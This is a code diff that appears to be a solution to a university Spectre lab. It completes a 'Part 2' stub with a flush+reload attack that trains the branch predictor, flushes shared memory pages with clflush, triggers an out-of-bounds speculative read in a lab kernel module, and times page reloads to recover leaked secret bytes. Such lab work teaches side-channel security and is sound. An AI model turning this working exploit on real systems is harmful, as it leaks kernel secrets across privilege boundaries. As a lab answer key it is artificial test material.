@@ -11,6 +11,9 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define DRAM_THRESHOLD 200
+#define TRAINING_LOOPS 10
+
 /*
  * call_kernel_part2
  * Performs the COMMAND_PART2 call in the kernel
@@ -47,6 +50,31 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
+
+        // 1. Train: Train the branch predictor to expect to perform the load (take the “if" branch) by calling the
+        // method many times with a small offset.
+        for (size_t i = 0; i < TRAINING_LOOPS; i++) {
+            call_kernel_part2(kernel_fd, shared_memory, 0); // Call with a small offset to train the branch predictor
+        }
+
+        // 2. Flush: Flush the memory region from the cache using clflush.
+        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+            clflush(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE)); // Flush the start of each page
+        }
+
+        // 3. Victim execution: Call the victim method to leak a given secret byte past the limit during speculative
+        // execution.
+        call_kernel_part2(kernel_fd, shared_memory, current_offset);
+
+        // 4. Reload: Reload the memory region, measure the latency of accessing each address, and use the
+        // latency to determine the value of the secret.
+        for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+            size_t idx = i * SHD_SPECTRE_LAB_PAGE_SIZE; // 4096 * i to get the start of each page
+            uint64_t time = time_access(shared_memory + idx);
+            if (time < DRAM_THRESHOLD) {
+                leaked_byte = (char)i;
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
